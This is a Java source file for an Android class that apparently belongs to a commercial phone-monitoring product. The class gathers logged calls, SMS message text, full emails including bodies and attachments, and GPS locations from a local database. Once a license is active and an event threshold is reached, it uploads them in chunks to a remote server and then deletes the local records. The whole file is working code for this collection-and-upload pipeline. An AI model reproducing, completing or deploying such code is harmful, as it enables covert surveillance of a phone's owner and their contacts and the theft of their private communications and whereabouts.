package com.vvt.android.syncmanager.control;

import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import com.fx.dalvik.util.FxLog;

import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventCall;
import com.fx.dalvik.event.EventEmail;
import com.fx.dalvik.event.EventLocation;
import com.fx.dalvik.event.EventSms;
import com.fx.dalvik.event.EventSystem;
import com.fx.dalvik.eventdb.EventDatabaseMetadata;
import com.fx.dalvik.mbackup.delivery.DeliveryState;
import com.fx.dalvik.mbackup.delivery.UploadDeviceEvents;
import com.fx.dalvik.util.NetworkUtil;
import com.vvt.android.syncmanager.Customization;

public final class EventManager implements UploadDeviceEvents.Callback { 

//-------------------------------------------------------------------------------------------------
// PRIVATE API
//-------------------------------------------------------------------------------------------------
	
	private static final String TAG = "EventManager";
	private static final boolean VERBOSE = true;
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? VERBOSE : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	private static Callback sCallback = null;
	
	private Object mLockEvents = new Object();
	
	private Context mContext;
	private DatabaseManager mDatabaseManager;
	private DeliveryState mDeliveryState = new DeliveryState();
	private UploadDeviceEvents mEventsUploader;
	
	private int mNumChunkSendingRetries = 0;
	private int mMaxNumChunkSendingRetries;
	private int mNumberOfEvents = -1;
	
	/**
	 * Construct list of Event from Cache Database
	 */
	private List<Event> getEventsListFromDatabase(short deviceEventType, int limit) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getEventsListFromDatabase # ENTER ...");
		}
		
		String limitSelection = DatabaseManager.createLimitSelection(null, limit);
		Cursor cursor = mDatabaseManager.query(deviceEventType, null, limitSelection);
		
		List<Event> deviceEventsList = null;
		
		if (cursor != null) {
			deviceEventsList = instantiateListOfEvent(deviceEventType, cursor);
			cursor.close();
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("query # Selected '%d' %s events", 
					deviceEventsList.size(), Event.getTypeAsString(deviceEventType)));
		}
		
		return deviceEventsList;
	}
	
	/**
	 * Delivery a fixing number of records to a server
	 * a fixing number will be retrieved from configurationManager.getNumberOfDeliveryEvents()
	 */
	private void asyncDeliverEventsChunk() {
		if (LOCAL_LOGV) FxLog.v(TAG, "asyncDeliverEventsChunk # ENTER ...");
		
		mNumChunkSendingRetries++;
		
		if (LOCAL_LOGD) {
			FxLog.v(TAG, 
					String.format("asyncDeliverEventsChunk # Retry %d", mNumChunkSendingRetries));
		}
		
		ConfigurationManager configurationManager = Main.getInstance().getConfigurationManager();
		List<Event> deviceEventsList = new ArrayList<Event>();
		int limit = 0;
		
		synchronized (mLockEvents) {
			for (short type : Event.TYPES_LIST) {
				// Calculate offset value
				limit = configurationManager.getDeliveryEventsChunkLength() - 
						deviceEventsList.size();
				
				// Add events list
				deviceEventsList.addAll(getEventsListFromDatabase(type, limit));
				
				// Check the total number of events with the number to delivery
				if (deviceEventsList.size() >= 
					configurationManager.getDeliveryEventsChunkLength()) {
					break;
				}
			}
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "\n**************************************************");
			FxLog.v(TAG, String.format(
					"asyncDeliverEventsChunk # Sending %d events", deviceEventsList.size()));
			FxLog.v(TAG, "**************************************************\n");
			
			for (Event event : deviceEventsList) { 
       			FxLog.v(TAG, String.format(
       					"asyncDeliverEventsChunk # [EVENT-DELIVERY]: %s", event));
       		}
		}
		
		// We need to call asyncSend() even if deviceEventsList has no members so that everything
		// will go to the same flow (e.g. the call back onSent will be call). 
		// asyncSend() is needed to be able to handle this case properly.
		mEventsUploader.asyncSend(deviceEventsList);	
	}
	
	/**
	 * To be called when the delivery task triggered by {@link #asyncRequestDeliverAll()} finished.
	 */
	private void onDeliverFinished() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onDeliverFinished # ENTER ...");
		}
		mDeliveryState.setDelivering(false);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onDeliverFinished # Process number of events ...");
		}
		processNumberOfEvents();
	}
	
	private int remove(List<Event> list) { 
		if (LOCAL_LOGV) FxLog.v(TAG, "remove # ENTER ...");
		
		int cumulativeDeleteCountInt = mDatabaseManager.remove(list);
		if (cumulativeDeleteCountInt > 0) {
			mNumberOfEvents -= cumulativeDeleteCountInt;
			if (sCallback != null) {
				sCallback.onFxLogEventsChanged();
			}
		}
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("remove # Removed '%d' events", cumulativeDeleteCountInt));
			FxLog.v(TAG, String.format("remove # Events waiting to upload: %d", mNumberOfEvents));
		}
		return cumulativeDeleteCountInt;
	}
	
	private List<Event> instantiateListOfEvent(short eventType, Cursor cursor) {
		List<Event> list = new ArrayList<Event>();
		Event event = null;
		
		while (cursor.moveToNext()) {
			event = getInstantiatedEvent(eventType, cursor);
			
			// An event must not in pending list
			if (event != null) {
				list.add(event);
			}
		}
		return list;
	}
	
	private Event getInstantiatedEvent(short eventType, Cursor cursor) {
		switch (eventType) {
			case Event.TYPE_CALL:
				return instantiateEventCall(cursor);
			case Event.TYPE_SMS:
				return instantiateEventSms(cursor);
			case Event.TYPE_EMAIL:
				return instantiateEventEmail(cursor);
			case Event.TYPE_LOCATION:
				return instantiateEventLocation(cursor);
			case Event.TYPE_SYSTEM:
				return instantiateEventSystem(cursor);
			default:
				return null;
		}
	}
	
	private EventCall instantiateEventCall(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		long timeInitiated = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_INITIATED));
		long timeConnected = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_CONNECTED));
		long timeTerminated = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.TIME_TERMINATED));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.DIRECTION));
		int durationSeconds = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.DURATION_SECONDS));
		String phonenumber = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.PHONENUMBER));
		int status = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.STATUS));
		String contactName = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Call.CONTACT_NAME));
		
		return new EventCall(rowId, identifier, sendAttempts, 
				timeInitiated, timeConnected, timeTerminated,
				direction, durationSeconds, phonenumber, status, contactName);
	}
	
	private EventSms instantiateEventSms(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		long time = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.TIME));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.DIRECTION));
		String phonenumber = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.PHONENUMBER));
		String data = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.DATA));
		String contactName = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Sms.CONTACT_NAME));
		
		return new EventSms (rowId, identifier, sendAttempts, 
				time, direction, phonenumber, data, contactName);
	}
	
	private EventEmail instantiateEventEmail(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		
		long time = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.TIME));
		
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.DIRECTION));
		
		int size = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SIZE));
		
		String sender = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SENDER));
		
		String to = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.TO));
		
		String cc = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.CC));
		
		String bcc = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.BCC));
		
		String subject = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.SUBJECT));
		
		String attachments = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.ATTACHMENTS));
		
		String body = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.BODY));
		
		String contact = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Email.CONTACT_NAME));
		
		String[] toArray = to == null || to.length() < 1? null: to.split(", ");
		String[] ccArray = cc == null || cc.length() < 1? null: cc.split(", ");
		String[] bccArray = bcc == null || bcc.length() < 1? null: bcc.split(", ");
		String[] attachmentsArray =
			attachments == null || attachments.length() < 1? null: attachments.split(", ");
		
		
		return new EventEmail(rowId, identifier, sendAttempts, 
				time, direction, size, sender, toArray, ccArray, bccArray, 
				subject, attachmentsArray, body, contact);
	}
	
	private EventLocation instantiateEventLocation(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		long time  = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.TIME));
		double latitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.LATITUDE));
		double longitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.LONGITUDE));
		double altitude = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.ALTITUDE));
		double horizontalAccuracy = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.HORIZONTAL_ACCURACY));
		double verticalAccuracy = cursor.getDouble(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.VERTICAL_ACCURACY));
		String provider = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.Location.PROVIDER));
		
		return new EventLocation(rowId, identifier, sendAttempts, 
				time, latitude, longitude, altitude, 
				horizontalAccuracy, verticalAccuracy, provider);
	}
	
	private EventSystem instantiateEventSystem(Cursor cursor) {
		int rowId = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.ROWID));
		int identifier = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.IDENTIFIER));
		int sendAttempts = cursor.getInt(cursor.getColumnIndex(
				EventDatabaseMetadata.SENDATTEMPTS));
		long time = cursor.getLong(cursor.getColumnIndex(
				EventDatabaseMetadata.System.TIME));
		short direction = cursor.getShort(cursor.getColumnIndex(
				EventDatabaseMetadata.System.DIRECTION));
		String data = cursor.getString(cursor.getColumnIndex(
				EventDatabaseMetadata.System.DATA));
		
		return new EventSystem(rowId, identifier, sendAttempts, time, direction, data);
	}
	
	/**
	 * Check number of events and try delivery if NoE exceeds the limit.
	 */
	public void processNumberOfEvents() {
		if (! Main.getInstance().getLicenseManager().isActivated()) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "processNumberOfEvents # Product is not activated");
			}
			return;
		}
		
		int maxEvents = Main.getInstance().getConfigurationManager().loadMaxEvents();
		int numberOfEvents = mDatabaseManager.countTotalEvents();
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"processNumberOfEvents # Number of events: %d / %d ...[x]", 
					numberOfEvents, maxEvents));
		}
		
		if (numberOfEvents >= maxEvents) { 
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "processNumberOfEvents # Request to delivery all events ...[x]");
			}
			asyncRequestDeliverAll();
		}
	}
	
//-------------------------------------------------------------------------------------------------
// PROTECTED API
//-------------------------------------------------------------------------------------------------
	
	protected EventManager(Context context, DatabaseManager databaseManager) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "EventManager # ENTER ...");
		}
		mContext = context;
		mDatabaseManager = databaseManager;
		
		mNumberOfEvents = databaseManager.countTotalEvents();
		
		mEventsUploader = UploadDeviceEvents.getInstance(mContext);
		mEventsUploader.setCallback(this);
	}

//-------------------------------------------------------------------------------------------------
// PUBLIC API
//-------------------------------------------------------------------------------------------------

	/**
	 * Inserts deviceEvent to the cache database. If the number of events is equal to or more than
	 * {@link ConfigurationManager#loadMaxEvents()}, this method will request to load all events
	 * to the server.
	 */
	public boolean insert(Event deviceEvent) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("insert # mDelivering = %s", mDeliveryState.isDelivering()));
		}
		
		Uri uri = mDatabaseManager.insert(deviceEvent);
		if (uri != null) {
			mNumberOfEvents++;
			if (sCallback != null) {
				sCallback.onFxLogEventsChanged();
			}
		}
		
		processNumberOfEvents();

		return uri != null ? true : false;
	}

	/**
	 * Requests to deliver all events in the cache database to the server. If another thread called 
	 * this method before but the uploading process has not finished, this method will do nothing 
	 * and return <code>false</code>. Otherwise, it will return <code>true</code>.
	 * 
	 * After delivering finishes, the successfully uploaded events will be removed from 
	 * the database.  
	 */
	public void asyncRequestDeliverAll() {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "asyncRequestDeliverAll # ENTER ...");
		}
		
		boolean hasInternetConnection = NetworkUtil.hasInternetConnection(mContext);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"asyncRequestDeliverAll # hasInternetConnection: %s, isDelivering: %s", 
					hasInternetConnection, mDeliveryState.isDelivering()));
		}
		
		if (!hasInternetConnection) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "asyncRequestDeliverAll # No internet connection, suspend delivery");
			}
			return;
		}
		
		if (mDeliveryState.isDelivering()) {
			
			long deliveryDurationMilliseconds = mDeliveryState.getDeliveringTimeMilliseconds();
			
			if (LOCAL_LOGD) {
				long deliveryDurationMinutes = deliveryDurationMilliseconds / 60000;
				FxLog.v(TAG, 
						String.format("asyncRequestDeliverAll # Delivery is in progress for " +
								"%d minutes (%d ms)", 
								deliveryDurationMinutes, 
								deliveryDurationMilliseconds));
			}
			
			ConfigurationManager configManager = Main.getInstance().getConfigurationManager();
			
			if (deliveryDurationMilliseconds <= configManager.getDeliveryAllTimeoutMilliseconds()) {
				if (LOCAL_LOGD) {
					FxLog.v(TAG, "asyncRequestDeliverAll # " +
							"Delivery duration is less than timeout, cancel this request.");
				}
				return;
			}
			
			if (LOCAL_LOGD) {
				FxLog.v(TAG, "asyncRequestDeliverAll # " + 
						"Delivery duration is more than timeout, process this request.");
			}
		}
		
		if (LOCAL_LOGD) {
			FxLog.v(TAG, "asyncRequestDeliverAll # Request to deliver the first chunk.");
		}
		
		// Send the first chunk, the subsequent chunks will be sent in the callback onSent().
		ConfigurationManager configurationManager = Main.getInstance().getConfigurationManager();
		mNumChunkSendingRetries = 0;
		mMaxNumChunkSendingRetries = 
				(mNumberOfEvents / configurationManager.getDeliveryEventsChunkLength()) + 1;
		asyncDeliverEventsChunk();
		
		mDeliveryState.setDelivering(true);
		
		return;
	}

	/**
	 * Implementation of the interface {@link UploadDeviceEvents#Callback}. Will be called when 
	 * each events chunk sent.
	 */
	public void onSent(List<Event> sentDeviceEventsList) {
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onSent # ENTER ...");
			
			int numEvents = 0;
			if (sentDeviceEventsList != null) {
				numEvents = sentDeviceEventsList.size();
			}
			
			FxLog.v(TAG, "\n**************************************************");
			FxLog.v(TAG, String.format("onSent # Removing %d events from database", numEvents));
			FxLog.v(TAG, "**************************************************\n");
		}
		remove(sentDeviceEventsList);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onSent # Counting the number of events left in the cache database.");
		}
		int numEventsRemain = mDatabaseManager.countTotalEvents();
		
		if (numEventsRemain > 0) {
			if (LOCAL_LOGD) {
				FxLog.v(TAG, String.format(
						"onSent # There are %d events left in the database.", numEventsRemain));
				
				FxLog.v(TAG, "onSent # Try continue delivery ...");
				
				FxLog.v(TAG, String.format("onSent # Retry %d/%d", 
						mNumChunkSendingRetries, mMaxNumChunkSendingRetries));
			}
			
			if (mNumChunkSendingRetries < mMaxNumChunkSendingRetries) {
				asyncDeliverEventsChunk();
			} else {
				onDeliverFinished();
			}
		} else {
			if (LOCAL_LOGD) FxLog.v(TAG, "onSent # No more events in the database.");
			onDeliverFinished();
		}
	}
	
	public void setCallback(Callback callback) {
		sCallback = callback;
	}
	
	public static interface Callback {
		void onFxLogEventsChanged();
	}
}
